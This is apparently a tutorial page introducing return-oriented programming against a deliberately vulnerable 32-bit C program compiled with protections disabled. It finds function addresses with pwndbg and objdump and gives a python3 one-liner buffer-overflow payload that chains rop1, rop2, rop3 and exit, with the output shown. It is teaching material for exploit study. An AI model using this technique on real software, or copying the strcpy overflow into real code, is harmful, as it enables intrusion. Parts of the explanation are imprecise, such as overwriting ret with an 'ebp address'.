---
description: 10/04/2023
---

# â›“ ROP Chains 101

## Introduction

<mark style="color:yellow;">**Return-Oriented Programming**</mark> (<mark style="color:yellow;">**ROP**</mark>) will allow you to utilize functions either found in the program or dynamically linked in a shared library such as `libc`. When you complete a function's flow of execution, it will execute a `ret` instruction, likely to `main()`. We want to overwrite this `ret` instruction with the `ebp` address of our target function instead.

## 32-bit Example

`rop1.c`:

```c
#include <stdio.h>>
#include <string.h>

void rop1() 
{
    printf("ROP 1!\n");
}

void rop2() {
    printf("ROP 2!\n");
}

void rop3() {
    printf("ROP 3!\n");
}

void vulnerable(char* string) 
{
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) 
{
    vulnerable(argv[1]);
    return 0;
}
```

<mark style="color:yellow;">Notice how this program requires the usage of an argument</mark>, whcih will utilize `strcpy()` to store the argument in our buffer and variable, `string`.&#x20;

#### Compiling our binary

```
gcc rop1.c -o rop1 -m32 -fno-stack-protector -no-pie -z execstack
```

### ROP Chain Setup

The ROP chain for this program could have many variations, but one could be: `rop1()` -> `rop2()` -> `rop3` -> `exit()`(dynamically-linked to `libc`).

Notice how this is combining _**ret2libc**_ and _**ret2win**_ techniques.

### Using `pwndbg` to find addresses

```
disass rop1
   0x08049182 <+0>:     push   ebp
   
disass rop2
   0x080491ad <+0>:     push   ebp
   
disass rop3
   0x080491d8 <+0>:     push   ebp

disass exit
   0xf7dbb460 <+0>:     endbr32
```

### Using `objdump` to find addresses

```
objdump -d rop1 | grep rop1
rop1:     file format elf32-i386
08049182 <rop1>:

objdump -d rop1 | grep rop2
080491ad <rop2>:

objdump -d rop1 | grep rop3
080491d8 <rop3>:
```

### Payload Structure

**Payload Structure to achieve our ROP chain:**&#x20;

`AAAA`'s (to get to `EIP`) + `B`'s (to overwrite `EBP` with garbage) + `&rop1` + `&rop2` + `&rop3` + `&exit`

**Remember:** <mark style="color:yellow;">We will need to place our obtained addresses above in little-endian format in order for our payload to work</mark>.

### Using `python3` to Manually Exploit our Target Binary

{% code overflow="wrap" %}
```
./rop1 "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*108 + b'\x42\x42\x42\x42' + b'\x82\x91\x04\x08' + b'\xad\x91\x04\x08' + b'\xd8\x91\x04\x08' + b'\x60\xb4\xdb\xf7')")"
```
{% endcode %}

#### Result

```
./rop1 "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*108 + b'\x42\x42\x42\x42' + b'\x82\x91\x04\x08' + b'\xad\x91\x04\x08' + b'\xd8\x91\x04\x08' + b'\x60\xb4\xdb\xf7')")"
ROP 1!
ROP 2!
ROP 3!
Segmentation fault
```
